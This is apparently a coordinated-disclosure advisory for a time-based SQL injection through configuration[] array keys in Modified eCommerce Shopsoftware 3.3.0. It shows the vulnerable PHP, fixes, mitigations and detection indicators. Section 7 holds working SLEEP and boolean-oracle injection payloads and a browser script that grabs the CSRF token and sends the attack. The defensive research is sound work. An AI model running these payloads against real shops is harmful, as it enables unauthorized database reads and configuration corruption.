<div align="center">

# SQL Injection in Modified eCommerce Shopsoftware 3.3.0 via `admin/module_export.php`

<a href="https://github.com/carlosalbertotuma/RedScan_Research_Team"><img src="https://img.shields.io/badge/RedScan-Research%20Team-B22222?style=for-the-badge" alt="RedScan Research Team"></a>
<img src="https://img.shields.io/badge/CWE--89-SQL%20Injection-orange?style=for-the-badge" alt="CWE-89 SQL Injection">
<img src="https://img.shields.io/badge/Severity-High%20(preliminary)-red?style=for-the-badge" alt="Severity High (preliminary)">

</div>

Blind time-based SQL Injection (CWE-89), identified by static analysis and confirmed by dynamic validation, in the administrative export-module controller of
[modified eCommerce Shopsoftware](https://github.com/modified-shop/modified-shop) 3.3.0,
via the client-controlled key of the `configuration[]` array.

| | |
|---|---|
| **CVE** | {CVE-YYYY-NNNNN} |
| **Affected version** | 3.3.0 (r16825) |
| **Component** | `admin/module_export.php`, `save` action (`configuration[]` array key) |
| **CWE** | CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection') |
| **Suggested severity** | High (preliminary, CVSS to be confirmed: see section 8) |
| **Status** | {Unpatched / Under investigation} |
| **Publication date** | {YYYY-MM-DD} |
| **Last updated** | {YYYY-MM-DD} |

---

## 1. Identification

- **Product:** Modified eCommerce Shopsoftware ([modified-shop/modified-shop](https://github.com/modified-shop/modified-shop))
- **Analyzed version:** 3.3.0, revision 16825
- **Endpoint:** `admin/module_export.php` (`save` action)
- **Functional parameter:** the **key** of the `configuration[]` array sent via POST (e.g. `configuration[MODULE_PRODUCTS_EXPORT_FILE]`)
- **Vulnerability type:** Blind time-based SQL Injection
- **CWE:** CWE-89
- **Suggested severity:** High (preliminary)
- **Analysis method:** Static source-code analysis and dynamic validation in a lab
- **Dynamic validation:** Performed on 2026-11-11, with a calibrated time-based channel and confirmed read of DBMS metadata (section 7)
- **Researcher:** Dom Cabral ([domcabral9](https://github.com/domcabral9)), *RedScan Research Team*

---

## 2. Description

A SQL Injection vulnerability was identified in the `save` action of the export-module controller in the administrative panel.

The endpoint `admin/module_export.php` persists module configuration through an `UPDATE` query on the `configuration` table. For each entry in the `$_POST['configuration']` array, the **value** is escaped with `xtc_db_input()`, but the array **key** is concatenated directly into the query's `WHERE` clause with no neutralization.

The array keys are client-controlled, because the form submits fields in the form `configuration[KEY_NAME]=value`. The global input filter (`includes/classes/inputfilter.php`) only handles first-level parameters with fixed names and does not traverse the `configuration` array, so the key reaches the query intact.

As a result, an authenticated administrator can inject arbitrary SQL into the `UPDATE`'s `WHERE` clause, enabling database reads through a blind time-based channel.

The same unescaped-key concatenation pattern is also present in `admin/modules.php`.

---

## 3. Technical evidence

### 3.1. Vulnerable code

File: `admin/module_export.php` (`save` action)

```php
foreach ($_POST['configuration'] as $key => $value) {
    if (is_array($_POST['configuration'][$key])) {
        // ... multi-language configuration handling ...
    }
    xtc_db_query("UPDATE " . TABLE_CONFIGURATION . "
                     SET configuration_value = '" . xtc_db_input($value) . "',
                         last_modified = NOW()
                   WHERE configuration_key = '" . $key . "'");
    if (@strpos($key, 'FILE') !== false) $file = $value;
}
```

Analysis:

- `$value` is passed through `xtc_db_input()` (which calls `mysqli_real_escape_string()`): protected.
- `$key` is **not** passed through any escaping: concatenated raw into the `WHERE` clause.
- The `$_POST['configuration']` array is indexed by client-controlled key names.

### 3.2. The escape function is applied to the value only

File: `inc/db_functions_mysqli.inc.php`

```php
function xtc_db_input($string, $link='db_link') {
  global ${$link};
  if (!empty($string)) {
    if (function_exists('mysqli_real_escape_string')) {
      return mysqli_real_escape_string(${$link}, $string);
    }
    return addslashes($string);
  }
  return $string;
}
```

It is only called on `$value`. The key `$key` is never passed to it.

### 3.3. The global filter does not cover the key

File: `includes/classes/inputfilter.php`

The `inputValidate()` method only iterates the first level of `$_GET`/`$_POST` and applies validations by fixed parameter name:

```php
switch ($key) {
  case 'page': case 'cID': case 'oID': /* ... */
    $this->params[$key] = $this->validateNumeric($value);
    break;
  case 'action':
    $this->params[$key] = $this->validateSigns($value);
    break;
  // ...
  default:
    // price validation only for keys with specific suffixes
}
```

The `configuration` array falls into `default`, which only applies price validation to keys with suffixes such as `_price` or `_weight`. Generic keys inside `configuration[]` pass through intact.

### 3.4. The same pattern in `admin/modules.php`

```php
xtc_db_query("update " . TABLE_CONFIGURATION . " set configuration_value = '" . xtc_db_input($value) . "' where configuration_key = '" . $key . "'");
```

Same construct: escaped value, raw-concatenated key. This endpoint should be fixed as well.

---

## 4. Pre-conditions and impact

**Pre-conditions:**

1. A valid administrator session with access to `admin/module_export.php`.
2. An installed export module whose configuration keys exist in the `configuration` table (e.g. `MODULE_PRODUCTS_EXPORT_FILE`).

**Potential impact:**

- Reading arbitrary DBMS data through a blind time-based channel (metadata, schema, and by extension table contents).
- Full enumeration of the database schema.
- Writing `configuration_value` into the `configuration` table through the legitimate `UPDATE`, which can alter store behavior and, in poorly calibrated tests, corrupt the configuration and bring the application down (integrity and availability impact).

Unauthenticated access was not demonstrated, nor was the execution of multiple stacked statements. Exploitation requires administrative privilege. The risk is relevant in environments with **administrators of differing trust** (e.g. an operator with access to the export modules but not to the database), since the flaw crosses the application boundary and reads the DBMS directly.

---

## 5. Recommendation

The fix must neutralize the key before using it in the query. In order of preference:

**Option 1 (preferred): key allow-list**

Validate each key against the module's known key set before any query, and reject the entire request when an unknown key is sent:

```php
$allowed_keys = array_flip($module->keys());

foreach ((array)$_POST['configuration'] as $key => $value) {
    if (!isset($allowed_keys[$key])) {
        http_response_code(400);
        exit('Invalid configuration key');
    }
    // Update only a previously authorized key.
}
```

**Option 2: prepared statement (definitive fix)**

```php
$stmt = mysqli_prepare($db_link,
    "UPDATE configuration SET configuration_value = ?, last_modified = NOW() WHERE configuration_key = ?");
mysqli_stmt_bind_param($stmt, 'ss', $value, $key);
mysqli_stmt_execute($stmt);
```

**Option 3 (minimal): escape the key**

```php
xtc_db_query("UPDATE " . TABLE_CONFIGURATION . "
                 SET configuration_value = '" . xtc_db_input($value) . "', last_modified = NOW()
               WHERE configuration_key = '" . xtc_db_input($key) . "'");
```

Option 1 is the most appropriate for this context, since the valid keys are known and returned by `$module->keys()`. Apply the same fix to `admin/modules.php`.

Additional recommendations:

- Extend `Inputfilter` to validate nested arrays recursively, or handle the `configuration` array explicitly.
- Review other admin code paths that concatenate array keys into SQL queries.
- Keep the existing CSRF protection, bearing in mind that CSRF protection does not fix SQL Injection.
- Add an automated test that sends quotes, SQL comments and delay functions in `configuration[]` keys.

---

## 6. Conclusion

Static analysis identified a SQL Injection chain in the `save` action of `admin/module_export.php`, caused by concatenating the `configuration[]` array key into the `WHERE` clause of an `UPDATE` without escaping.

Dynamic validation (section 7) confirmed the injection through a blind time-based channel, with extraction of DBMS metadata (user, database and version) and schema enumeration.

**Result:** SQL Injection identified by static analysis and **confirmed by dynamic validation**.

**Suggested classification:** High (preliminary), given direct DBMS reads, and subject to the final CVSS calculation (section 8). The administrative-privilege requirement is reflected in the vector (`PR:H`).

---

## 7. Dynamic validation (proof of concept)

The PoC demonstrates the injection via a harmless time oracle (a controlled delay of 1 to 4 seconds) and the reading of the DBMS's own metadata. It must be used only in authorized environments. The lab host and the internal container address were replaced with `[REDACTED]`.

### 7.1. Injection point (SLEEP PoC)

The `configuration[]` array key is reflected in the `WHERE` clause. All it takes is an **existing** key (so the `WHERE` matches the row) followed by a delay function.

**Minimal form (direct delay):**

```
configuration[MODULE_EXPORT_INSTALLED' AND SLEEP(4) AND '1'='1]=
```

Since `SLEEP(4)` returns `0`, the final `WHERE` condition is false and **no row is updated**: the ~4 s delay proves the injection without altering the configuration.

Result (evidence 5):

```
{status: 200, elapsed_ms: 4023, bytes: 0}
```

The result was independently reproduced by the RedScan Research Team (`elapsed_ms: 4019`).

Reading the fields:

- **`status: 200`:** the `save` action was processed normally, with the CSRF token accepted.
- **`elapsed_ms: 4023`:** the delay matches the `SLEEP(4)` executed by MariaDB.
- **`bytes: 0`:** with `redirect: "manual"`, the request stops at the legitimate redirect the endpoint issues after `save` (`xtc_redirect`). The empty body is expected, and the measured time does not include loading the destination page.

**Reproducible request (browser console, with an active admin session):**

The script reads the CSRF token from the page itself (hidden field whose name follows the pattern `x` + 5 alphanumeric characters and whose value is 32 or more characters long), sends the injected key to the `save` action and measures the response time.

```js
(async () => {
  const base = "/admin/module_export.php?set=export&module=products_export";

  const page = await fetch(base, { credentials: "same-origin", cache: "no-store" });
  const doc = new DOMParser().parseFromString(await page.text(), "text/html");
  const token = [...doc.querySelectorAll('input[type="hidden"]')]
    .find(e => /^x[A-Za-z0-9]{5}$/.test(e.name) && e.value.length >= 32);

  const key = "MODULE_EXPORT_INSTALLED' AND SLEEP(4) AND '1'='1";
  const body = new URLSearchParams();
  body.set(`configuration[${key}]`, "");
  if (token) body.set(token.name, token.value);

  const start = performance.now();
  const r = await fetch(base + "&action=save", {
    method: "POST",
    credentials: "same-origin",
    cache: "no-store",
    redirect: "manual",
    headers: { "Content-Type": "application/x-www-form-urlencoded" },
    body
  });
  const response = await r.text();

  console.log({
    status: r.status,
    elapsed_ms: Math.round(performance.now() - start),
    bytes: response.length
  });
})();
```

**Boolean-oracle form (used to extract data):**

```
configuration[MODULE_PRODUCTS_EXPORT_FILE' AND (SELECT 1 FROM (SELECT IF(<cond>,SLEEP(1),0)) x) AND '1'='1]=products_export.csv
```

Here `<cond>` is the tested condition and the submitted value (`products_export.csv`) is the row's original value, kept so the configuration is not altered during extraction.

### 7.2. Channel calibration

A repeatable comparison between a true and a false condition:

| Condition | Response time |
|---|---|
| true (1 s delay) | ~1063 ms |
| false (no delay) | ~59 ms |

The repeatable difference above 1000 ms (signal-to-noise ratio of ~18x) confirms the time-based channel.

### 7.3. Extracted metadata (impact evidence)

Through the oracle, the following DBMS metadata was read:

| Metadata | Value obtained |
|---|---|
| `USER()` | `modified@[REDACTED]` |
| `DATABASE()` | `modified` |
| `VERSION()` | `10.11.19-MariaDB-ubu2204` |
| Total tables in the schema | 101 |

### 7.4. Evidence

| # | Evidence | File |
|---|---|---|
| 1 | Console showing channel calibration (true ~1063 ms vs false ~59 ms) | [`evidence/01-time-calibration.jpg`](evidence/01-time-calibration.jpg) |
| 2 | Extracted metadata (`USER()`, `DATABASE()`, `VERSION()`) | [`evidence/02-extracted-metadata.jpg`](evidence/02-extracted-metadata.jpg) |
| 3 | Schema table count (101) | [`evidence/03-table-count.jpg`](evidence/03-table-count.jpg) |
| 4 | **Confirmed write to the `configuration` table** (FILE field value changed via `$value`) | [`evidence/04-configuration-write.jpg`](evidence/04-configuration-write.jpg) |
| 5 | **SLEEP PoC:** reproducible request script and result `{status: 200, elapsed_ms: 4023, bytes: 0}` with `SLEEP(4)` in the `MODULE_EXPORT_INSTALLED` key | [`evidence/05-sleep-poc.jpg`](evidence/05-sleep-poc.jpg) |

> **Note:** the lab host and the internal container address were replaced with `[REDACTED]`. No credentials, cookies or tokens appear in the evidence. All screenshots are in the [`evidence/`](evidence/) folder.

### 7.5. Reproduction steps

1. Install Modified eCommerce Shopsoftware **3.3.0** (revision 16825) with default settings.
2. Log into the admin panel with an account that has access to the export modules.
3. Ensure the **products_export** module is installed (the `MODULE_PRODUCTS_EXPORT_FILE` key exists in the `configuration` table).
4. Submit to the `save` action a `configuration[]` key containing a delay function, as in section 7.1. The request must include the page's CSRF token (hidden field issued by the form itself) when required.
5. **Observed:** the response time tracks the condition (high when true, low when false), confirming the injection.
6. **Expected (secure behavior):** the key is validated/escaped and no injection occurs, regardless of timing.

### 7.6. PoC limitations

- Uses only a controlled delay (`SLEEP`) as proof; does not cause intentional downtime.
- Reads only the DBMS's own metadata; does not extract third-party personal data.
- Methodology note: the direct boolean oracle (`IF`) produced false positives on `information_schema` queries; enumeration was confirmed via binary search over the ASCII code, which was adopted as the reliable method. The count of 101 tables was corroborated by a direct query to the database in the authorized environment.
- The SLEEP PoC and the data extraction do not alter the configuration: the minimal form updates no row, and the oracle form resubmits the row's original value. The only deliberate change was the write test in evidence 4, which modified a single field (the `products_export` file name) in the lab.
- Does not create persistence or a backdoor.
- Contains no real credentials.
- Does not automate mass exploitation.

> Operational-security note: the vulnerable sink is an `UPDATE`. Conditions that match multiple rows overwrite the `configuration` table and can take the store down. Any authorized test should preserve the original value and avoid broad conditions, with a database backup available.

---

## 8. Classification

- **Suggested severity:** High (preliminary)

### CVSS

- **CVSS:** {VECTOR_AND_SCORE to be confirmed}
- **Preliminary estimate (aligned with the team's official advisory):** `CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H` (7.2, High). `A:H` reflects that writing to the `configuration` table can break the application (observed in the lab). The final calculation will be confirmed with the RedScan Research Team.

### CWE

- **CWE-89:** Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')

### CAPEC

- **CAPEC-66:** SQL Injection

---

## 9. Mitigation

Until an official fix is available:

- Restrict access to the export modules to fully trusted administrators only.
- Apply least privilege to the database user used by the application.
- Monitor anomalous queries and changes to the `configuration` table.

> Mitigations reduce the risk but do not eliminate the vulnerability.

---

## 10. Detection and indicators

- POST requests to `/admin/module_export.php?...&action=save` with `configuration[]` keys containing single quotes, `AND`, `SELECT`, `SLEEP(` or `BENCHMARK(`.
- Repeatable response-time spikes on this endpoint.
- Unexpected entries in the `configuration` table or overwritten values with no matching module.

---

## 11. Disclosure timeline

| Date | Event |
|---|---|
| 2026-11-11 | Vulnerability identified by static analysis (RedScan Research Team) |
| 2026-11-11 | Dynamic validation performed in a lab |
| {YYYY-MM-DD} | Vendor notified |
| {YYYY-MM-DD} | Receipt acknowledged |
| {YYYY-MM-DD} | CVE requested / reserved |
| {YYYY-MM-DD} | Fix released |
| {YYYY-MM-DD} | Advisory published |

---

## 12. Vendor communication

- **Vendor:** Modified eCommerce Shopsoftware (https://www.modified-shop.org/)
- **Channel used:** {CHANNEL}
- **First notification date:** {YYYY-MM-DD}
- **Response status:** {Answered / No response / Under review}
- **Vendor position:** {SUMMARY}
- **Fixed version:** {FIXED_VERSION}

---

## 13. Credits

<div align="center">

<a href="https://github.com/carlosalbertotuma/RedScan_Research_Team"><img src="https://img.shields.io/badge/RedScan-Research%20Team-B22222?style=for-the-badge" alt="RedScan Research Team"></a>

### *RedScan Research Team*

<sub>Offensive Security · Vulnerability Research · Coordinated Disclosure</sub>

| Role | Member |
|:---:|:---:|
| 🏅 **Lead Researcher** | Carlos Tuma ([bl4dsc4n](https://github.com/carlosalbertotuma)) |
| 🏅 **Lead Researcher** | Smith Braz ([smithbraz](https://github.com/smithbraz)) |
| **Researcher** (dynamic validation and report) | Dom Cabral ([domcabral9](https://github.com/domcabral9)) |

**Honors**

<sub>With honors and deep gratitude to <b>Carlos Tuma</b> and <b>Smith Braz</b>, who lead the RedScan Research Team,<br>for building the lab, mentoring every step of this research<br>and teaching responsible, coordinated disclosure.</sub>

<sub>Contact for corrections, questions or disclosure coordination: <a href="mailto:domcabral@proton.me">domcabral@proton.me</a></sub>

<sub>A research group of students and instructors from <a href="https://www.redscanacademy.com.br/">RedScan Academy</a>.</sub>

</div>

---

## 14. References

- https://github.com/modified-shop/modified-shop
- https://github.com/modified-shop/modified-shop/blob/v3.3.0/admin/module_export.php
- https://github.com/modified-shop/modified-shop/releases/tag/v3.3.0
- https://cwe.mitre.org/data/definitions/89.html
- https://capec.mitre.org/data/definitions/66.html
- https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html
- {CVE_RECORD_URL}
- {NVD_URL}
- {VULDB_URL}

---

## 15. Revision history

| Version | Date | Change |
|---|---|---|
| 1.0 | 2026-11-11 | Initial version with static analysis and dynamic validation |
| 1.1 | 2026-11-11 | SLEEP PoC with reproducible request, result field breakdown and evidence 5 |
| 1.2 | 2026-11-11 | Advisory consolidated into this single English README (separate EN and PT-BR files removed) |
| 1.3 | 2026-11-12 | Lab addresses redacted in the evidence; evidence files renamed to English; dates in ISO format; allow-list fix rejects unknown keys; stacked statements, CSRF and regression-test notes added; PoC limitation on configuration writes clarified |

---

## 16. Legal notice

This advisory is published for educational, defensive and security-improvement purposes. The information was obtained in an isolated, authorized lab environment and disclosed responsibly. The author does not encourage the use of this information for unauthorized access or any illegal activity. Use of the information in this document is the reader's sole responsibility.
